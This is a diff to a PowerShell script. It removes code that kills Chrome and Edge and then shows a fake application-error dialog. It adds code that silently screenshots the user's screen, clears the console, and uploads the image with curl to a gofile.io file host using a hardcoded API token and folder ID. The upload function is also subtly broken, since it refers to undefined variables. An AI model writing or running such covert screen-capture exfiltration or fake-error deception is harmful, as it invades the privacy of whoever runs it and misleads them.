@@ -1,9 +1,50 @@
 Add-Type -AssemblyName System.Windows.Forms
-Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
-if ($?) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Error")
+Add-Type -AssemblyName System.Drawing
+
+$filePath = "$env:USERPROFILE\Desktop\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen
+$top    = $screen.Bounds.Top
+$left   = $screen.Bounds.Left
+$width  = $screen.Bounds.Width
+$height = $screen.Bounds.Height
+
+
+$bitmap = New-Object System.Drawing.Bitmap($width, $height)
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
+$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+Start-Sleep -Milliseconds 20
+$graphics.Dispose()
+$bitmap.Dispose()
+cls
+Write-Host "Screenshot saved to: $filePath" -ForegroundColor Green
+
+function Upload-FilesToGofile {
+    param (
+        [string]$FilePath,
+        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
+        [string]$newFolderId
+    )
+    try {
+ 
+
+            if (Test-Path $file) {
+               
+                $uploadUri = "https://store1.gofile.io/uploadFile"
+                
+                
+                curl.exe -sS -F "file=@$file" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
+                cls
+                Remove-Item $zipPath -Force
+                
+                Start-Sleep -Milliseconds 200
+                
+            }
+        }
+   
+    catch {
+        Clear-Host # This is your os.system("cls")
+    }
 }
-Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
-if ($?) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Error")
-}
+Upload-FilesToGofile -FilePath $filePath -newFolderId "a96550e5-fd58-4965-a787-a5d20ec20bdc"
